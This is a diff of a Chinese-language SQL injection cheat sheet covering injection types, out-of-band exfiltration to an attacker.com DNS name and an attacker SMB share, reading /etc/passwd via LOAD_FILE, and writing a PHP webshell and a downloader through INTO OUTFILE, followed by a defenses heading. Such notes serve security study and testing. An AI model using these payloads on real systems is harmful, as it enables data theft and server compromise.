@@ -1,10 +1,8 @@
-# SQL注入漏洞
-
-### 原理
-
-SQL injection主要是对用户请求中的输入参数过滤不严格造成的，如动态拼接字符串。
+### 简介
+SQL注入漏洞(SQL injection) - 对用户请求中的输入的参数值过滤不严(如动态拼接字符串)
 
 ### 类型
+
 * boolean-based blind 基于布尔的盲注
 * time-based blind 基于时间的盲注
 * error-based 基于报错
@@ -52,20 +50,20 @@ test.get_content() #获取第一列第一个字段内容
 
 * 数据泄露 - 带外通道得到数据(Out Of Band Channeling)
   * DNS Requests - `LOAD_FILE`可以发出DNS请求
-    * `SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\'));`
+    * MySQL `SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\abc'));`
   * SMB Requests - `INTO OUTFILE`可以发出SMB请求
-    * `' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt`
+    * MySQL `' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt`
 * 读取文件内容(Reading Files) Files can be read if the user has FILE privileges.
   * LOAD_FILE()
-    * `SELECT LOAD_FILE('/etc/passwd');`
-    * `SELECT LOAD_FILE(0x2F6574632F706173737764);`
+    * MySQL `SELECT LOAD_FILE('/etc/passwd');`
+    * MySQL `SELECT LOAD_FILE(0x2F6574632F706173737764);`
 * 写入文件(Writing Files) Files can be created if the user has FILE privileges.
-  * `INTO OUTFILE` 或 `INTO DUMPFILE`
+  * MySQL `INTO OUTFILE` 或 `INTO DUMPFILE`
     * Get WebShell `SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';` 访问WebShell `http://localhost/shell.php?c=cat%20/etc/passwd`
     * Downloader `SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'` 访问 `http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`
 
 
-### 防御方法
+### SDL - 防御与修复方案
 
 * 1. 预编译语法/参数化查询
 
